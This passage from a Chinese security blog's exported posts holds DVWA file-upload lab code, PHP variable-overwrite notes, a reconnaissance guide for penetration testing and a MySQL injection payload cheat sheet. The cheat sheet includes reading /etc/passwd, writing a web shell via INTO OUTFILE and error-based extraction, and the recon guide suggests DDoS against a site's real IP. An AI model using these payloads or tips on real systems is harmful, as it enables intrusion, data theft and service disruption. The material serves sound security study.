&quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;		( $uploaded_size &lt; 100000 ) &amp;&amp;		getimagesize( $uploaded_tmp ) ) &#123;		// Can we move the file to the upload folder?		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;			// No			$html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;		&#125;		else &#123;			// Yes!			$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;		&#125;	&#125;	else &#123;		// Invalid file		$html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>待续。。。。firfox有问题</p>
<h2 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// File information	$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);	$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];	$uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];	$uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];	// Where are we going to be writing to?	$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;	//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;	$target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;	$temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;	// Is it an image?	if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;		( $uploaded_size &lt; 100000 ) &amp;&amp;		( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;		getimagesize( $uploaded_tmp ) ) &#123;		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)		if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;			$img = imagecreatefromjpeg( $uploaded_tmp );			imagejpeg( $img, $temp_file, 100);		&#125;		else &#123;			$img = imagecreatefrompng( $uploaded_tmp );			imagepng( $img, $temp_file, 9);		&#125;		imagedestroy( $img );		// Can we move the file to the web root from the temp folder?		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;			// Yes!			$html .= &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;		&#125;		else &#123;			// No			$html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;		&#125;		// Delete any temp files		if( file_exists( $temp_file ) )			unlink( $temp_file );	&#125;	else &#123;		// Invalid file		$html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;	&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>



<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><h3 id="1-extract"><a href="#1-extract" class="headerlink" title="1.extract()"></a>1.extract()</h3><p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extract(array,extract_rules,prefix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>必需。规定要使用的数组。</td>
</tr>
<tr>
<td><em>extract_rules</em></td>
<td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 可能的值：  EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 <br />EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 <br />EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。 <br />EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。 <br />EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。 <br />EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 <br />EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td>
</tr>
<tr>
<td><em>prefix</em></td>
<td>可选。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。 前缀和数组键名之间会自动加上一个下划线。</td>
</tr>
</tbody></table>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>对属性或方法的访问控制，是通过在前面添加关键字 <em>public</em>（公有），<em>protected</em>（受保护）或 <em>private</em>（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
</script></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>资产探索与信息搜集（不完整篇）</title>
    <url>/2020/05/02/%E8%B5%84%E4%BA%A7%E6%8E%A2%E7%B4%A2%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><strong>一、前言</strong></h1><p>在众测中，基本上SRC的漏洞收集范围有如下几种形式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">形式一：暂时仅限以下系统：www.xxx.com,其他域名不在此次测试范围内</span><br><span class="line">形式二：只奖励与*.xxx.com相关的漏洞</span><br><span class="line">形式三：无限制</span><br><span class="line"></span><br><span class="line">形式一，基本被限定了范围</span><br><span class="line">形式二，注重于子域名的收集</span><br><span class="line">形式三，子域名及相关域名的收集</span><br></pre></td></tr></table></figure>

<p>另外，随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着“隐形资产”，这些“隐形资产”通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。</p>
<p>在渗透测试中，我们需要尽可能多的去收集目标的信息，资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信息，这对我们进一步的渗透测试显得尤为重要。</p>
<p>在这里，通过介绍一些资产探测和信息收集的技巧，来收集渗透目标的信息。</p>
<p>假设我们只拿到了一个主域名。</p>
<h1 id="二、资产探测"><a href="#二、资产探测" class="headerlink" title="二、资产探测"></a><strong>二、资产探测</strong></h1><p>从主域名出发，我们首先需要考虑的是子域名，即*.xxx.com，接下来进行子域名搜集思路的梳理。</p>
<h2 id="2-1-子域名收集"><a href="#2-1-子域名收集" class="headerlink" title="2.1 子域名收集"></a><strong>2.1 子域名收集</strong></h2><h3 id="A、搜索引擎查询"><a href="#A、搜索引擎查询" class="headerlink" title="A、搜索引擎查询"></a><strong>A、搜索引擎查询</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Google、baidu、Bing等传统搜索引擎</span><br><span class="line"><span class="attr">site</span>:baidu.com inurl:baidu.com</span><br><span class="line">搜target.com|公司名字</span><br><span class="line"></span><br><span class="line">网络空间安全搜索引擎</span><br><span class="line">zoomeye(钟馗之眼)：https:<span class="comment">//www.zoomeye.org</span></span><br><span class="line">shodan：https:<span class="comment">//www.shodan.io</span></span><br><span class="line">Fofa：https:<span class="comment">//fofa.so</span></span><br><span class="line">Censys：https:<span class="comment">//www.censys.io</span></span><br><span class="line">Dnsdb搜索引擎：https:<span class="comment">//www.dnsdb.io</span></span><br><span class="line"></span><br><span class="line">PS：可编写Python脚本批量查询、获取</span><br></pre></td></tr></table></figure>

<h3 id="B、在线查询接口"><a href="#B、在线查询接口" class="headerlink" title="B、在线查询接口"></a><strong>B、在线查询接口</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//tool.chinaz.com/subdomain/</span></span><br><span class="line">http:<span class="comment">//i.links.cn/subdomain/    </span></span><br><span class="line">http:<span class="comment">//subdomain.chaxun.la/</span></span><br><span class="line">http:<span class="comment">//searchdns.netcraft.com/</span></span><br><span class="line">https:<span class="comment">//www.virustotal.com/</span></span><br><span class="line">https:<span class="comment">//censys.io/</span></span><br><span class="line">https:<span class="comment">//x.threatbook.cn/ 微步在线</span></span><br></pre></td></tr></table></figure>

<h3 id="C、子域名暴力猜解"><a href="#C、子域名暴力猜解" class="headerlink" title="C、子域名暴力猜解"></a><strong>C、子域名暴力猜解</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">爆破工具：</span><br><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:<span class="comment">//github.com/ring04h/wydomain    </span></span><br><span class="line">subDomainsBrute:https:<span class="comment">//github.com/lijiejie/</span></span><br><span class="line">Sublist3r:https:<span class="comment">//github.com/aboul3la/Sublist3r</span></span><br></pre></td></tr></table></figure>

<h3 id="D、DNS查询-枚举"><a href="#D、DNS查询-枚举" class="headerlink" title="D、DNS查询/枚举"></a><strong>D、DNS查询/枚举</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">DNS查询：</span><br><span class="line">host -t a domainName</span><br><span class="line">host -t mx domainName</span><br><span class="line"></span><br><span class="line">优点：非常直观，通过查询DNS服务器的A记录、CNAME等，可以准确得到相关信息，较全。</span><br><span class="line">缺点：有很大的局限性，很多DNS是禁止查询的。</span><br><span class="line">参考：https:<span class="comment">//www.cnblogs.com/xuanhun/p/3489038.html</span></span><br><span class="line"></span><br><span class="line">域传送漏洞</span><br><span class="line"></span><br><span class="line">DNS暴力破解：fierce</span><br><span class="line">参考链接：http:<span class="comment">//blog.csdn.net/jeanphorn/article/details/44987549</span></span><br><span class="line"></span><br><span class="line">Passive DNS</span><br><span class="line">参考链接：http:<span class="comment">//www.freebuf.com/articles/network/103815.html</span></span><br></pre></td></tr></table></figure>

<h3 id="E、HTTPS证书"><a href="#E、HTTPS证书" class="headerlink" title="E、HTTPS证书"></a><strong>E、HTTPS证书</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中。SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</span><br><span class="line"></span><br><span class="line">SSL证书搜索引擎：</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//certdb.com/domain/github.com</span></span><br><span class="line">https:<span class="comment">//crt.sh/?Identity=%%.github.com</span></span><br><span class="line">https:<span class="comment">//censys.io/</span></span><br><span class="line"></span><br><span class="line">基于 HTTPS 证书的子域名收集小程序 ：GetDomainsBySSL.py</span><br><span class="line">参考链接：http:<span class="comment">//www.freebuf.com/articles/network/140738.html</span></span><br></pre></td></tr></table></figure>

<h3 id="F、综合搜索"><a href="#F、综合搜索" class="headerlink" title="F、综合搜索"></a><strong>F、综合搜索</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">提莫：https:<span class="comment">//github.com/bit4woo/teemo </span></span><br><span class="line">主要有三大模块：搜索引擎 第三方站点 枚举 </span><br><span class="line"></span><br><span class="line">利用全网IP扫描http端口 在访问IP的<span class="number">80</span>或者<span class="number">8080</span>端口的时候，可能会遇到配置了<span class="number">301</span>跳转的，可以在header里获取域名信息。</span><br><span class="line">全网扫描结果如下：https:<span class="comment">//scans.io/study/sonar.http</span></span><br></pre></td></tr></table></figure>

<h3 id="G、子域名筛选"><a href="#G、子域名筛选" class="headerlink" title="G、子域名筛选"></a><strong>G、子域名筛选</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">当收集的子域名数量过大，手动筛选工作量太大，如何快速扫描，半自动的筛选出有效的可能存在漏洞的子域名。</span><br><span class="line">参考链接：http:<span class="comment">//www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/3413.html</span></span><br></pre></td></tr></table></figure>

<h2 id="2-2-相关域名收集："><a href="#2-2-相关域名收集：" class="headerlink" title="2.2 相关域名收集："></a><strong>2.2 相关域名收集：</strong></h2><h3 id="A、旁站及c段收集"><a href="#A、旁站及c段收集" class="headerlink" title="A、旁站及c段收集"></a><strong>A、旁站及c段收集</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">同IP网站及C段查询</span><br><span class="line">IP反查域名</span><br><span class="line"></span><br><span class="line">工具：御剑、K8</span><br><span class="line">在线查询工具：</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www.hackmall.cn/</span></span><br><span class="line">http:<span class="comment">//www.webscan.cc/  推荐</span></span><br><span class="line">https:<span class="comment">//phpinfo.me/bing.php </span></span><br><span class="line"></span><br><span class="line">将C段收集的相关IP，推测该单位所在的IP段，再针对IP段进行服务器端口扫描</span><br></pre></td></tr></table></figure>

<h3 id="B、端口扫描"><a href="#B、端口扫描" class="headerlink" title="B、端口扫描"></a><strong>B、端口扫描</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">对<span class="number">1</span>-<span class="number">65535</span>端口扫描，探测Web服务端口</span><br></pre></td></tr></table></figure>

<h3 id="C、主站提取"><a href="#C、主站提取" class="headerlink" title="C、主站提取"></a><strong>C、主站提取</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">通过编写爬虫，从主站页面（一般在主页）获取相关业务系统</span><br><span class="line">思路是：通过访问主域名或者子域名，然后爬取页面上该域名的所有子域名，</span><br><span class="line">然后循环访问获取到的子域名，然后再次循环，直到爬完为止</span><br><span class="line"></span><br><span class="line">跨域策略文件 crossdomain.xml</span><br><span class="line">如：https:<span class="comment">//www.baidu.com/crossdomain.xml</span></span><br></pre></td></tr></table></figure>

<h3 id="D、移动端"><a href="#D、移动端" class="headerlink" title="D、移动端"></a><strong>D、移动端</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。</span><br></pre></td></tr></table></figure>

<h3 id="E、行业系统"><a href="#E、行业系统" class="headerlink" title="E、行业系统"></a><strong>E、行业系统</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比</span><br><span class="line">通用：办公OA、邮件系统、VPN等</span><br><span class="line">医院：门户、预约系统、掌上医院、微信公众平台等</span><br></pre></td></tr></table></figure>

<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a><strong>三、信息收集</strong></h1><p>主要是针对单个站点的信息收集技巧，主要围绕服务器IP、域名、网站。</p>
<h2 id="3-1-服务器IP"><a href="#3-1-服务器IP" class="headerlink" title="3.1 服务器IP"></a><strong>3.1 服务器IP</strong></h2><h3 id="A、绕过CDN查找网站真实ip"><a href="#A、绕过CDN查找网站真实ip" class="headerlink" title="A、绕过CDN查找网站真实ip"></a><strong>A、绕过</strong><a href="https://cloud.tencent.com/product/cdn?from=10680"><strong>CDN</strong></a><strong>查找网站真实ip</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、查询历史DNS记录：</span><br><span class="line">查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//dnsdb.io/zh-cn/</span></span><br><span class="line">https:<span class="comment">//x.threatbook.cn/</span></span><br><span class="line">http:<span class="comment">//toolbar.netcraft.com/site_report?url=</span></span><br><span class="line">http:<span class="comment">//viewdns.info/</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、xcdn</span><br><span class="line">    <span class="attr">https</span>:<span class="comment">//github.com/3xp10it/xcdn</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、Zmap扫描全网</span><br><span class="line">操作方法：http:<span class="comment">//bobao.360.cn/learning/detail/211.html</span></span><br><span class="line"></span><br><span class="line">Tips：找到真实ip，绑定host ，是否可以打开目标网站，就是真实IP，对真实IP进行入侵测试，DDOS流量攻击，CC等等，实现无视CDN防御。</span><br></pre></td></tr></table></figure>

<h3 id="B、识别服务器及中间件类型"><a href="#B、识别服务器及中间件类型" class="headerlink" title="B、识别服务器及中间件类型"></a><strong>B、识别服务器及中间件类型</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">远程操作系统探测</span><br><span class="line">用 NMAP 探测操作系统</span><br></pre></td></tr></table></figure>

<h3 id="C、端口及服务"><a href="#C、端口及服务" class="headerlink" title="C、端口及服务"></a><strong>C、端口及服务</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Nmap  <span class="number">1</span>-<span class="number">65535</span>端口扫描，探测端口服务</span><br></pre></td></tr></table></figure>

<h3 id="D、查询IP所在位置"><a href="#D、查询IP所在位置" class="headerlink" title="D、查询IP所在位置"></a><strong>D、查询IP所在位置</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">IP地址查询：</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www.hao7188.com</span></span><br><span class="line">http:<span class="comment">//www.882667.com</span></span><br></pre></td></tr></table></figure>

<h2 id="3-2-域名"><a href="#3-2-域名" class="headerlink" title="3.2 域名"></a><strong>3.2 域名</strong></h2><h3 id="A、搜索引擎"><a href="#A、搜索引擎" class="headerlink" title="A、搜索引擎"></a><strong>A、搜索引擎</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Google Hacking</span><br><span class="line">Google Hacking查找，如site:baidu.com inurl:admin，使用类似语法，获取网站的敏感信息</span><br></pre></td></tr></table></figure>

<h3 id="B、whois信息-DNS解析"><a href="#B、whois信息-DNS解析" class="headerlink" title="B、whois信息/DNS解析"></a><strong>B、whois信息/DNS解析</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">在whois查询中，获取注册人姓名和邮箱、电话信息，可以通过搜索引擎，社交网络，进一步挖掘出更多域名所有人的信息</span><br><span class="line">DNS服务器</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//whois.chinaz.com</span></span><br><span class="line">https:<span class="comment">//whois.aliyun.com</span></span><br><span class="line">域名注册邮箱，可用于社工或是登录处的账号。</span><br></pre></td></tr></table></figure>

<h2 id="3-3-站点"><a href="#3-3-站点" class="headerlink" title="3.3 站点"></a><strong>3.3 站点</strong></h2><h3 id="A、robots-txt"><a href="#A、robots-txt" class="headerlink" title="A、robots.txt"></a><strong>A、robots.txt</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，可能存在一些敏感路径。</span><br></pre></td></tr></table></figure>

<h3 id="B、网站架构"><a href="#B、网站架构" class="headerlink" title="B、网站架构"></a><strong>B、网站架构</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">网站语言、数据库，网站框架、组件框架历史漏洞</span><br><span class="line">常用的网站架构如：LAMP/LNMP</span><br><span class="line">PHP框架：ThinkPHP</span><br></pre></td></tr></table></figure>

<h3 id="C、目录结构-后台地址"><a href="#C、目录结构-后台地址" class="headerlink" title="C、目录结构/后台地址"></a><strong>C、目录结构/后台地址</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">常见的敏感目录以及文件扫描,这些对以后的突破都可能产生至关重要的作用。</span><br><span class="line">收集的方式有爬虫采集，目录扫描</span><br><span class="line"><span class="number">1</span>）使用爬虫获取网站目录结构。如wvs爬虫功能获取网站目录结构。</span><br><span class="line"><span class="number">2</span>）使用目录猜解工具暴力猜解。如：御剑后台扫描工具、7kbscan-WebPathBrute</span><br></pre></td></tr></table></figure>

<h3 id="D、敏感文件信息泄露"><a href="#D、敏感文件信息泄露" class="headerlink" title="D、敏感文件信息泄露"></a><strong>D、敏感文件信息泄露</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">备份文件、测试文件、Github泄露、SVN源码泄露</span><br></pre></td></tr></table></figure>

<h3 id="E、web-指纹"><a href="#E、web-指纹" class="headerlink" title="E、web 指纹"></a><strong>E、web 指纹</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">云悉在线WEB指纹CMS识别平台：http:<span class="comment">//www.yunsee.cn</span></span><br></pre></td></tr></table></figure>

<h3 id="F、安全防护"><a href="#F、安全防护" class="headerlink" title="F、安全防护"></a><strong>F、安全防护</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">安全防护，云waf、硬件waf、主机防护软件、软waf</span><br></pre></td></tr></table></figure>

<p>参考链接：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">我是如何收集厂商ip段，并进行简单的信息探测的</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www.91ri.org/15674.html</span></span><br><span class="line">他山之石 | 渗透测试中的各种子域名枚举技术介绍</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www.freebuf.com/articles/web/154809.html</span></span><br><span class="line">子域名搜集思路与技巧梳理</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www.freebuf.com/articles/web/117006.html</span></span><br><span class="line">企业人员信息收集</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//www.zhihu.com/question/24195319</span></span><br></pre></td></tr></table></figure>



<h3 id="PunkSPIDER映射哪些类型的漏洞？"><a href="#PunkSPIDER映射哪些类型的漏洞？" class="headerlink" title="PunkSPIDER映射哪些类型的漏洞？"></a>PunkSPIDER映射哪些类型的漏洞？</h3><ul>
<li>BSQLI = <a href="https://www.owasp.org/index.php/Blind_SQL_Injection">盲SQL注入</a></li>
<li>SQLI = <a href="https://www.owasp.org/index.php/SQL_Injection">SQL注入</a></li>
<li>XSS = <a href="https://www.owasp.org/index.php/XSS_Attacks">跨站点脚本</a></li>
<li>TRAV = <a href="https://www.owasp.org/index.php/Path_Traversal">路径遍历</a></li>
<li>MXI = <a href="http://en.wikipedia.org/wiki/Email_injection">邮件标题注入或电子邮件注入</a></li>
<li>OSCI = <a href="https://www.owasp.org/index.php/OS_Command_Injection">操作系统命令注入</a></li>
<li>XPATHI = <a href="https://www.owasp.org/index.php/XPATH_Injection">XPath注入</a></li>
</ul>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>资产探索</tag>
      </tags>
  </entry>
  <entry>
    <title>paylaod-sql</title>
    <url>/2020/05/02/paylaod-sql/</url>
    <content><![CDATA[<p>所有用户：<br><code>select group_concat(user) from mysql.user</code></p>
<p>用户hash：<br><code>select group_concat(password) from mysql.user where user=&#39;root&#39;</code></p>
<p>所有数据库：<br><code>SELECT group_concat(schema_name) from information_schema.schemata</code></p>
<p>表名：<br><code>SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;</code></p>
<p>//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来<br><code>SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=&#39;库名&#39;</code></p>
<p>字段名：<br><code>SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;</code></p>
<p>读文件：<br><code>SELECT load_file(&#39;/etc/passwd&#39;)</code></p>
<p>写文件：<br><code>SELECT  into outfile &#39;/var/www/html/shell.php&#39;</code></p>
<h2 id="1-2-UNION注入"><a href="#1-2-UNION注入" class="headerlink" title="1.2 UNION注入"></a>1.2 UNION注入</h2><h3 id="1-2-1-猜字段长度"><a href="#1-2-1-猜字段长度" class="headerlink" title="1.2.1 猜字段长度"></a>1.2.1 猜字段长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by num`</span><br><span class="line">Example：`id=1 order by 2` 页面正常，`id=3 order by 6`页面错误，那么字段就是2</span><br><span class="line">字符型的话需要注释后面的引号，Example：</span><br><span class="line">`id=1&#x27; order by 2%23</span><br></pre></td></tr></table></figure>

<h3 id="1-2-2-暴字段位置"><a href="#1-2-2-暴字段位置" class="headerlink" title="1.2.2 暴字段位置"></a>1.2.2 暴字段位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 UNION SELECT 1,2 或 id=-1 UNION SELECT 1,2</span><br></pre></td></tr></table></figure>

<h3 id="1-2-3-基本语法"><a href="#1-2-3-基本语法" class="headerlink" title="1.2.3 基本语法"></a>1.2.3 基本语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT 1,password,3 from admin</span><br></pre></td></tr></table></figure>

<h2 id="1-3-报错注入"><a href="#1-3-报错注入" class="headerlink" title="1.3 报错注入"></a>1.3 报错注入</h2><p>mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法</p>
<h3 id="1-3-1-floor"><a href="#1-3-1-floor" class="headerlink" title="1.3.1 floor"></a>1.3.1 floor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure>

<h3 id="1-3-2-ExtractValue-有长度限制-最长32位"><a href="#1-3-2-ExtractValue-有长度限制-最长32位" class="headerlink" title="1.3.2 ExtractValue(有长度限制,最长32位)"></a>1.3.2 ExtractValue(有长度限制,最长32位)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>

<h3 id="1-3-3-UpdateXml-有长度限制-最长32位"><a href="#1-3-3-UpdateXml-有长度限制-最长32位" class="headerlink" title="1.3.3 UpdateXml(有长度限制,最长32位)"></a>1.3.3 UpdateXml(有长度限制,最长32位)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>

<h3 id="1-3-4-NAME-CONST-适用于低版本，不太好用"><a href="#1-3-4-NAME-CONST-适用于低版本，不太好用" class="headerlink" title="1.3.4 NAME_CONST(适用于低版本，不太好用)"></a>1.3.4 NAME_CONST(适用于低版本，不太好用)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>

